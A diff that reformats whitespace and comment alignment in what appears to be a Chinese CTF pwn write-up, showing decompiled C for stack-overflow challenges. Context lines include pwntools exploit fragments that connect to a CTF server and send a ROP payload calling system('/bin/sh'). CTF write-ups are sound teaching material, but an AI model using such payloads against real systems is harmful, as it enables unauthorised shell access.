@@ -26,14 +26,14 @@ amd64 小端，保护全开。程序是个数花瓣的小游戏，文案很长�
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  int ci; // [rsp+Ch] [rbp-A4h]
-  int idx1; // [rsp+10h] [rbp-A0h]
-  int rnum; // [rsp+14h] [rbp-9Ch]
-  __int64 sum; // [rsp+18h] [rbp-98h] BYREF
-  __int64 list[16]; // [rsp+20h] [rbp-90h] BYREF
-  int size; // [rsp+A0h] [rbp-10h] BYREF
-  int idx; // [rsp+A4h] [rbp-Ch]
-  unsigned __int64 v11; // [rsp+A8h] [rbp-8h]
+  int ci;                        // [rsp+Ch] [rbp-A4h]
+  int idx1;                      // [rsp+10h] [rbp-A0h]
+  int rnum;                      // [rsp+14h] [rbp-9Ch]
+  __int64 sum;                   // [rsp+18h] [rbp-98h] BYREF
+  __int64 list[16];              // [rsp+20h] [rbp-90h] BYREF
+  int size;                      // [rsp+A0h] [rbp-10h] BYREF
+  int idx;                       // [rsp+A4h] [rbp-Ch]
+  unsigned __int64 v11;          // [rsp+A8h] [rbp-8h]
 
   v11 = __readfsqword(0x28u);
   init(argc, argv, envp);
@@ -57,9 +57,9 @@ int __fastcall main(int argc, const char **argv, const char **envp)
     while ( idx < size )
     {
       printf("the flower number %d : ", ++idx);
-      scanf("%ld", &list[idx]);                 // 0   1   list[1]
-                                                // ...
-                                                // 16  17  list[17]
+      scanf("%ld", &list[idx]);  // 0   1   list[1]
+                                 // ...
+                                 // 16  17  list[17]
     }
     puts("\nDo you want to start with 'love me'");
     puts("...or 'not love me'?");
@@ -267,10 +267,10 @@ amd64 小端，PIE 和 canary 都没开。程序很短：
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  char format[4]; // [rsp+0h] [rbp-10h] BYREF
-  int v5; // [rsp+4h] [rbp-Ch] BYREF
-  int v6; // [rsp+8h] [rbp-8h] BYREF
-  int i; // [rsp+Ch] [rbp-4h]
+  char format[4];  // [rsp+0h] [rbp-10h] BYREF
+  int v5;          // [rsp+4h] [rbp-Ch] BYREF
+  int v6;          // [rsp+8h] [rbp-8h] BYREF
+  int i;           // [rsp+Ch] [rbp-4h]
 
   setvbuf(stdin, 0LL, 2, 0LL);
   setvbuf(_bss_start, 0LL, 2, 0LL);
@@ -294,7 +294,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 ssize_t __fastcall vuln(unsigned int a1)
 {
-  _BYTE buf[4]; // [rsp+1Ch] [rbp-4h] BYREF
+  _BYTE buf[4];    // [rsp+1Ch] [rbp-4h] BYREF
 
   printf("type something:");
   return read(0, buf, a1);
@@ -363,7 +363,7 @@ bss = 0x404050
 # io = process('./vuln')
 # gdb.attach(io, 'b *0x4011CC')
 
-addr = 'node1.hgame.vidar.club:31733'.split(':')    
+addr = 'node1.hgame.vidar.club:31733'.split(':')
 io = remote(addr[0], addr[1])
 
 io.recvuntil(b'n = ')
@@ -404,5 +404,4 @@ payload = b'a'*4+p64(buf-0x18)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
 io.sendline(payload)
 
 io.interactive()
-
 ```
